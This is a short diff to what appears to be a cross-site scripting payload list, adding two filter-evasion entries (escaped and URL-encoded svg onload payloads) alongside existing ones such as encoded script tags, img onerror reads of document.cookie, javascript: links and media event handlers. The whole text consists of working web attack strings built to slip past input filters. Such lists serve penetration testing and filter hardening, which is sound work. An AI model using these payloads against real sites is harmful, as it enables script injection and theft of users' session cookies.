@@ -30,7 +30,8 @@ JavaScript​:"<Svg/OnLoad​=alert%25%0A26lpar;1)>"
 \u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E
 %2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%2528document.cookie%2529%253E%2522%253E
 "\"\\u003Cimg src=x onerror=alert(document.cookie)>\""
-
+\<svg\ ononly\=1\ onload\=alert\(1\)\>
+%F0%9F%9A%90%3Csvg%20ononly=1%20onload=alert(1)%3E
 <a%2Fonmouseover%3D(confirm)(document.URL)>a
 <a href=javascript:origin>CLICK
 <audio controls onwaiting=alert(1)><source src=x type=x></audio>
